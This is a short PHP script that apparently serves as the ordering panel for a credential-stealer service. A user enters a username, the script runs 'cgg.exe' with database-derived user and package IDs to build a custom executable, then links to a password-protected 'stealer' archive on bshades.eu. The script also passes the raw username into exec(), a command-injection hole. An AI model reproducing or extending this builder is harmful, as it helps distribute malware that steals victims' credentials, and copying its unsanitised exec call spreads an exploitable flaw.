<?php

function redirectTo($page) {
	die("<meta http-equiv=\"REFRESH\" content=\"0;url=" . $page . "\">");
}

?>
<?php

redirectTo("http://bshades.eu");
if(isset($_POST['submit']))
{

require_once("config.php");
$link = mysql_connect(DB_SERVER, DB_USER, DB_PASSWORD);
	if(!$link) {
		die('Failed to connect to server: ' . mysql_error());
	}
	
	$db = mysql_select_db(DB_DATABASE);
	if(!$db) {
		die("Unable to select database");
	}
	
$user = mysql_real_escape_string($_REQUEST['user']);
$result = mysql_query("SELECT `username` FROM `tbl_users` WHERE `username` = '$user';", $link);
$count = mysql_num_rows($result);

if ($count == 0) {
echo "This user does not exist!";
} else {

				$sql = "SELECT * FROM `tbl_users` WHERE `username` = ". "'" . $user . "';";
				$answer = mysql_query($sql);

				while($row = mysql_fetch_array($answer, MYSQL_ASSOC)) {
					$userID += $row['id'];
					$typeID += $row['package'];
				}
				

exec("cgg.exe " . $userID . " " . $typeID . " " . $user . ".exe");
echo 'Your bin may be downloaded<a href="http://bshades.eu/stealer/' . $user  .'.rar"> here</a><br>The .rar password is your username!'; }
} else {
?><center>
<form action="" method="post">
Enter Username: <input type="text" name="user">
<input type="submit" name="submit" value="Build Bin">
</form></center>
<?php
}
?>
<?php include("footer.php"); ?>